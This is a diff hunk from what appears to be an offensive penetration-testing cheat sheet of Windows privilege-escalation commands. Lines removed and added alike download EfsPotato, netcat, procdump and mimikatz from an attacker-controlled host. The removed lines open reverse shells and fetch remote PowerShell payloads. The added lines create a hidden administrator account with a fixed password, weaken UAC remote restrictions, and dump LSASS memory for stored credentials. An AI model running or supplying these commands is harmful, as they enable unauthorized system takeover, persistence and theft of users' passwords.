@@ -1382,17 +1382,12 @@ $a.GetExportedTypes() | ForEach-Object { $_.FullName }
 [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils].GetMethods() | ft Name, IsStatic, ReturnType
 
 +---------- SeImpersonatePrivilege ----------+
-curl $MYIP:53/windows/EfsPotato.exe -o EfsPotato.exe
-curl $MYIP:53/windows/nc.exe -o nc.exe
-./EfsPotato.exe "nc.exe $MYIP 80 -e cmd"
-forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c \\$MYIP\$\EfsPotato.exe """powershell -c IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/resh.ps1');resh -Reverse $MYIP -Port 5566"""
-wmic process call create "\\$MYIP\$\EfsPotato.exe \"\\$MYIP\$\nc.exe $MYIP 80 -e cmd\""
-wmic process call create "\\$MYIP\$\jp32.exe -l 1337 -p \"cmd.exe\" -a \"/c \\$MYIP\$\nc.exe $MYIP 80 -e cmd\"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
-wmic process call create "\\$MYIP\$\churrasco.exe -d \"\\$MYIP\$\nc.exe -e cmd.exe $MYIP 80\""
+curl $MYIP/windows/EfsPotato.exe -o \windows\tasks\EfsPotato.exe
+\windows\tasks\EfsPotato.exe """powershell -c Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"""
 
 +---------- SeDebugPrivilege ----------+
-curl $MYIP/windows/procdump64.exe -o \programdata\procdump.exe; \programdata\procdump.exe -accepteula -ma lsass.exe lsass.dmp
-curl $MYIP/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
+curl $MYIP/windows/procdump64.exe -o \windows\tasks\procdump.exe; \windows\tasks\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+curl $MYIP/windows/mimikatz.exe -o \windows\tasks\mimikatz.exe; \windows\tasks\mimikatz.exe
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
 vault::cred
